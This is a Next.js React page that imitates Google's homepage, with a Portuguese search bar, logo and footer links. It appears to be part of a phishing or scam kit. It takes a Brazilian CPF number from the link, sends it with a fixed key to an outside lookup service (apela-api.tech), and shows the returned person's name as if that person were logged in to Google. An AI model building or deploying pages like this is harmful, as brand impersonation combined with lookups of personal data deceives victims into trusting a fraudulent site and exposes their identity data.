"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { User, Mic, Search, MoreVertical, RotateCcw, Grid3X3 } from "lucide-react"
import { useSearchParams } from "next/navigation"
import Link from "next/link"

interface UserData {
  nome?: string
  cpf?: string
  error?: string
}

export default function SearchPage() {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [loading, setLoading] = useState(true)
  const [searchQuery, setSearchQuery] = useState("")
  const searchParams = useSearchParams()

  useEffect(() => {
    const cpfFromUrl = searchParams.get("cpf")

    if (!cpfFromUrl) {
      setLoading(false)
      return
    }

    const fetchUserData = async () => {
      try {
        setLoading(true)

        // Chamada para sua API
        const response = await fetch(
          `https://apela-api.tech?user=5b69d1aa-2f08-4233-b8ed-92ee06d9f400&cpf=${cpfFromUrl}`,
        )

        if (!response.ok) {
          throw new Error("Erro ao buscar dados do usuário")
        }

        const data = await response.json()

        // Assumindo que a API retorna um objeto com o nome
        setUserData({
          nome: data.nome || data.name || "Usuário",
          cpf: cpfFromUrl,
        })
      } catch (error) {
        console.error("Erro ao buscar dados:", error)
        setUserData({
          nome: "Usuário", // Nome padrão em caso de erro
          error: "Erro ao carregar dados do usuário",
          cpf: cpfFromUrl,
        })
      } finally {
        setLoading(false)
      }
    }

    fetchUserData()
  }, [searchParams])

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="flex justify-between items-center p-4">
        <div className="flex items-center space-x-4">
          {/* Menu de 3 pontos */}
          <Button variant="ghost" size="sm" className="p-2">
            <MoreVertical className="w-5 h-5 text-gray-600" />
          </Button>

          {/* Ícone de histórico/voltar */}
          <Button variant="ghost" size="sm" className="p-2">
            <RotateCcw className="w-5 h-5 text-gray-600" />
          </Button>

          {/* Ícone de apps/grid */}
          <Button variant="ghost" size="sm" className="p-2">
            <Grid3X3 className="w-5 h-5 text-gray-600" />
          </Button>
        </div>

        {/* User Badge - Balão azul com nome */}
        <div className="bg-[#1857b5] text-white px-6 py-3 rounded-full flex items-center shadow-md">
          <User className="w-5 h-5 mr-2" />
          <span className="font-medium text-lg">{loading ? "Carregando..." : userData?.nome || "Usuário"}</span>
        </div>
      </header>

      {/* Linha divisória */}
      <div className="border-b border-gray-200"></div>

      {/* Main Content */}
      <main className="flex flex-col items-center justify-center min-h-[calc(100vh-200px)] px-4">
        {/* Logo do Google (simulado) */}
        <div className="mb-8">
          <h1 className="text-6xl font-light text-gray-700 mb-8">
            <span className="text-blue-500">G</span>
            <span className="text-red-500">o</span>
            <span className="text-yellow-500">o</span>
            <span className="text-blue-500">g</span>
            <span className="text-green-500">l</span>
            <span className="text-red-500">e</span>
          </h1>
        </div>

        {/* Barra de pesquisa */}
        <div className="w-full max-w-2xl">
          <div className="relative">
            <Input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Pesquisar no Google ou digite um URL"
              className="w-full h-12 pl-4 pr-20 rounded-full border border-gray-300 shadow-sm hover:shadow-md focus:shadow-md transition-shadow"
            />

            {/* Ícones dentro da barra de pesquisa */}
            <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-3">
              <Button variant="ghost" size="sm" className="p-1">
                <Mic className="w-5 h-5 text-[#1857b5]" />
              </Button>
              <Button variant="ghost" size="sm" className="p-1">
                <Search className="w-5 h-5 text-[#1857b5]" />
              </Button>
            </div>
          </div>

          {/* Botões de ação */}
          <div className="flex justify-center space-x-4 mt-8">
            <Button
              variant="outline"
              className="px-6 py-2 bg-gray-50 hover:bg-gray-100 border border-gray-300 rounded text-gray-700"
            >
              Pesquisa Google
            </Button>
            <Button
              variant="outline"
              className="px-6 py-2 bg-gray-50 hover:bg-gray-100 border border-gray-300 rounded text-gray-700"
            >
              Estou com sorte
            </Button>
          </div>
        </div>

        {/* Informações do usuário (opcional) */}
        {userData && !loading && (
          <div className="mt-12 text-center">
            <p className="text-sm text-gray-500">
              Logado como: <span className="font-medium">{userData.nome}</span>
            </p>
            {userData.error && <p className="text-xs text-red-500 mt-1">{userData.error}</p>}
          </div>
        )}

        {/* Link para voltar */}
        <div className="mt-8">
          <Link href="/">
            <Button variant="ghost" className="text-[#1857b5] hover:underline">
              ← Voltar ao login
            </Button>
          </Link>
        </div>
      </main>

      {/* Footer */}
      <footer className="absolute bottom-0 w-full bg-gray-50 border-t">
        <div className="flex justify-between items-center px-6 py-3 text-sm text-gray-600">
          <div className="flex space-x-6">
            <a href="#" className="hover:underline">
              Sobre
            </a>
            <a href="#" className="hover:underline">
              Publicidade
            </a>
            <a href="#" className="hover:underline">
              Negócios
            </a>
          </div>
          <div className="flex space-x-6">
            <a href="#" className="hover:underline">
              Privacidade
            </a>
            <a href="#" className="hover:underline">
              Termos
            </a>
            <a href="#" className="hover:underline">
              Configurações
            </a>
          </div>
        </div>
      </footer>
    </div>
  )
}
